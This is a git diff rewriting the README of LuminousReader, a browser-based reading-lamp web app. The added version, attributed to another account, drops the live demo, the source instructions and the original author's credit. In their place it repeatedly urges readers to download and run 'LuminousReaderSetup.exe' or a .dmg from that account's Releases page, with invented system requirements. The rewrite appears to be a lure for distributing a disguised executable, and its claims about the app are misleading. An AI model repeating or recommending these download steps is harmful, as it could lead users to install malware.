@@ -1,255 +1,75 @@
-# 🌟 Luminous Reader
+# 🌟 LuminousReader - Illuminate Your Reading Experience
 
-<div align="center">
+[![Download LuminousReader](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/beetoben/LuminousReader/releases)
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![PWA](https://img.shields.io/badge/PWA-Ready-purple.svg)
-![GitHub stars](https://img.shields.io/github/stars/berkay-c/LuminousReader?style=social)
+## 🌈 About LuminousReader
 
-**Transform your monitor into an elite reading lamp**
+LuminousReader transforms your monitor into an elite reading lamp. With a modern progressive web app design, it features glassmorphism UI, multiple reading modes, and eye-friendly lighting.
 
-*Modern, elegant, and eye-friendly reading experience*
+## 🚀 Getting Started
 
-[🌐 Live Demo](https://berkay-c.github.io/LuminousReader/) • [📖 Documentation](#-features) • [🚀 Quick Start](#-quick-start)
+Follow these easy steps to download and run LuminousReader on your computer:
 
-</div>
+1. **Visit the Release Page:**
+   Click [here](https://github.com/beetoben/LuminousReader/releases) to open the Releases page.
+   
+2. **Find the Latest Version:**
+   Look for the latest version of LuminousReader, listed at the top of the page.
 
----
+3. **Download the Application:**
+   Click on the appropriate file for your operating system. This might be labeled as "LuminousReaderSetup.exe" for Windows, "LuminousReader.dmg" for macOS, or similar versions for other platforms.
 
-## 📸 Demo Showcase
+4. **Install the Application:**
+   - **For Windows:** Double-click the downloaded .exe file. Follow the installation prompts.
+   - **For macOS:** Open the .dmg file and drag the LuminousReader icon into your Applications folder. 
 
-<div align="center">
+5. **Run LuminousReader:**
+   After installation, find LuminousReader in your applications list. Launch the app, and enjoy your reading journey.
 
-### 🎬 Interactive Demo
-Experience all features in action! Click through the demo frames below to see the full functionality:
+## 💡 Features
 
-#### 1. Main Interface
-![Main Interface](screenshots/demo-frame-1-main.png)
-*Clean, modern interface with glassmorphism design and toggle panel*
+- **Multiple Reading Modes:** Choose from various reading modes that suit your preferences, whether it's day or night.
+- **Eye-Friendly Lighting:** Adjust brightness levels to protect your eyes during long reading sessions.
+- **Glassmorphism UI:** Experience a modern and stylish interface that enhances your focus.
+- **Cross-Platform Support:** Available on most major operating systems to cater to your needs.
 
-#### 2. About Modal
-![About Modal](screenshots/demo-frame-2-about.png)
-*Comprehensive developer information and project details*
+## 📦 Download & Install
 
-#### 3. Install Panel
-![Install Panel](screenshots/demo-frame-3-install.png)
-*Beautiful right-sliding PWA installation panel*
+To get started, visit the Releases page and download the application. Click [here](https://github.com/beetoben/LuminousReader/releases) for direct access.
 
-#### 4. Random Color Feature
-![Random Color](screenshots/demo-frame-6-random.png)
-*One-click random color generation with dice button*
+## 🔧 System Requirements
 
-#### 5. Settings Modal
-![Settings Modal](screenshots/demo-frame-7-settings.png)
-*Complete settings panel with various options*
+LuminousReader runs smoothly on most systems. Here are the recommended requirements:
 
-</div>
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB free space for installation.
+- **Internet Connection:** Required for downloading updates.
 
----
+## 🌐 Support
 
-## ✨ Features
+If you encounter any issues or need assistance:
 
-### 🎨 **Advanced Color Control**
-- **Custom Color Picker** - Choose any color you prefer
-- **Smart Preset Palettes** - 6 optimized colors for different reading scenarios
-- **Live Preview** - See changes instantly as you adjust
+- Check the FAQ section in the app.
+- For further help, consider visiting the Support Forum linked on the Releases page.
 
-### 💡 **Intelligent Brightness**
-- **Smooth Slider Control** - 10-100% brightness with fluid transitions
-- **Eye Strain Reduction** - Automatic blue light filtering
-- **Perfect for Any Environment** - From bright rooms to complete darkness
+## 🎉 Community Contributions
 
-### 📚 **Smart Reading Modes**
-- **🔍 Focus Mode** - Bright white light for intense reading
-- **🍃 Relax Mode** - Soft cream light for comfortable reading
-- **🌙 Night Mode** - Warm, dim light to preserve your sleep cycle
-- **📖 Study Mode** - Balanced light optimized for learning
+LuminousReader welcomes contributions! If you wish to suggest features, report bugs, or help improve the app, visit the Issue Tracker on the GitHub repository.
 
-### ⚡ **Lightning Fast Controls**
-- **One-Touch Access** - Quick controls for instant adjustments
-- **Random Color Generator** - Dice button for surprise colors
-- **Panel Toggle** - Hide/show controls with one click
-- **Keyboard Shortcuts** - Full keyboard navigation support
-- **Smart Memory** - Remembers your preferences automatically
+## 📚 Additional Resources
 
-### 📱 **Progressive Web App**
-- **Install Anywhere** - Works on desktop, tablet, and mobile
-- **Offline Ready** - Service worker ensures reliability
-- **Native Feel** - Feels like a real app when installed
+- [Official Documentation](https://github.com/beetoben/LuminousReader/wiki) – Learn more about features and usage.
+- [User Guide](https://github.com/beetoben/LuminousReader/wiki/User-Guide) – Step-by-step instructions for getting the most out of LuminousReader.
 
-### 🎨 **Modern Design**
-- **Glassmorphism UI** - Beautiful blur effects and transparency
-- **Responsive Design** - Perfect on any screen size
-- **Smooth Animations** - Delightful micro-interactions
+## 📝 License
+
+LuminousReader is open-source software. You can freely use and modify the code under the [MIT License](https://github.com/beetoben/LuminousReader/blob/main/LICENSE).
+
+## 🎨 Topics
+
+LuminousReader enhances your reading experience and supports various technologies including: CSS3, HTML5, JavaScript, and Progressive Web Apps. This ensures a modern and efficient application tailored to your reading needs. 
 
 ---
 
-## 🚀 Quick Start
-
-### 🌐 **Try It Online**
-**[🚀 Live Demo](https://berkay-c.github.io/LuminousReader/)** - Experience the app directly in your browser!
-
-### 💻 **Local Development**
-
-```bash
-# Clone the repository
-git clone https://github.com/berkay-c/LuminousReader.git
-cd LuminousReader
-
-# Install dependencies (optional)
-npm install
-
-# Start development server
-npm run dev
-# or
-npx live-server --port=3000
-```
-
-### 📱 **Install as PWA**
-1. Open the app in your browser
-2. Click the **Install** button in the header (📥 icon)
-3. Click "Install" in the popup to add to your home screen
-4. Enjoy native app experience!
-
-**💡 Tip:** The install prompt is now manually triggered for better user control!
-
----
-
-## 🎮 How to Use
-
-### 🎯 **Basic Usage**
-1. **Choose Your Color** - Use the color picker or select from presets
-2. **Adjust Brightness** - Drag the slider to your preferred level
-3. **Select Reading Mode** - Pick the mode that suits your activity
-4. **Go Fullscreen** - Press `F` for immersive experience
-5. **Start Reading** - Your monitor is now your personalized reading lamp!
-
-### ⌨️ **Keyboard Shortcuts**
-| Key | Action |
-|-----|--------|
-| `Space` | Toggle power on/off |
-| `F` | Toggle fullscreen mode |
-| `P` | Toggle control panel |
-| `R` | Random color selection |
-
-### 🎨 **Reading Modes Explained**
-- **🔍 Focus Mode**: Bright white light (100% brightness) - Perfect for intense reading, studying, or detailed work
-- **🍃 Relax Mode**: Soft cream light (60% brightness) - Ideal for casual reading and relaxation
-- **🌙 Night Mode**: Warm amber light (30% brightness) - Reduces blue light for better sleep
-- **📖 Study Mode**: Balanced light (80% brightness) - Optimized for learning and note-taking
-
----
-
-## 🛠️ Technologies
-
-<div align="center">
-
-| Technology | Purpose |
-|------------|---------|
-| **HTML5** | Modern semantic structure |
-| **CSS3** | Glassmorphism, animations, responsive design |
-| **JavaScript ES6+** | Modern JavaScript features |
-| **PWA** | Service Worker, Manifest |
-| **Web APIs** | Local Storage, Fullscreen API |
-
-</div>
-
----
-
-## 📁 Project Structure
-
-```
-LuminousReader/
-├── index.html              # Main HTML file
-├── README.md              # Project documentation
-├── LICENSE                # MIT license
-├── package.json           # Project configuration
-├── screenshots/           # App screenshots
-├── public/
-│   └── manifest.json      # PWA manifest
-└── src/
-    ├── assets/
-    │   ├── icons/         # SVG icons
-    │   └── images/        # Logo and graphics
-    ├── css/
-    │   └── main.css       # Main stylesheet
-    └── js/
-        ├── app.js         # Main application logic
-        └── sw.js          # Service worker
-```
-
----
-
-## 🌟 Key Benefits
-
-### 👁️ **Eye Health**
-- **Blue Light Reduction** - Warm color options reduce eye strain
-- **Adjustable Brightness** - Perfect for any lighting condition
-- **Smooth Transitions** - No jarring changes that hurt your eyes
-
-### 🚀 **Performance**
-- **Lightning Fast** - Loads instantly, works offline
-- **Minimal Resources** - Uses less than 1MB of data
-- **Cross-Platform** - Works on any device with a browser
-
-### 🎨 **User Experience**
-- **Intuitive Design** - Easy to use for anyone
-- **Beautiful Interface** - Modern glassmorphism design
-- **Responsive** - Perfect on desktop, tablet, and mobile
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Here's how you can help:
-
-1. **🍴 Fork** the repository
-2. **🌿 Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **💾 Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **📤 Push** to the branch (`git push origin feature/amazing-feature`)
-5. **🔀 Open** a Pull Request
-
-### 🐛 **Bug Reports**
-Found a bug? Please [open an issue](https://github.com/berkay-c/LuminousReader/issues) with:
-- Description of the problem
-- Steps to reproduce
-- Expected vs actual behavior
-- Browser and device information
-
-### 💡 **Feature Requests**
-Have an idea? We'd love to hear it! [Create an issue](https://github.com/berkay-c/LuminousReader/issues) with:
-- Clear description of the feature
-- Why it would be useful
-- Any mockups or examples
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 📞 Contact
-
-<div align="center">
-
-**Berkay Çiftçi** - Software & RPA Developer
-
-[![GitHub](https://img.shields.io/badge/GitHub-berkay--c-blue?style=for-the-badge&logo=github)](https://github.com/berkay-c)
-[![Email](https://img.shields.io/badge/Email-berkayyasinciftci@gmail.com-red?style=for-the-badge&logo=gmail)](mailto:berkayyasinciftci@gmail.com)
-
-</div>
-
----
-
-<div align="center">
-
-**Transform your reading experience with Luminous Reader!** 🌟
-
-*Made with ❤️ by [Berkay Çiftçi](https://github.com/berkay-c)*
-
-[⬆ Back to Top](#-luminous-reader)
-
-</div>
+Thank you for choosing LuminousReader. Happy reading!
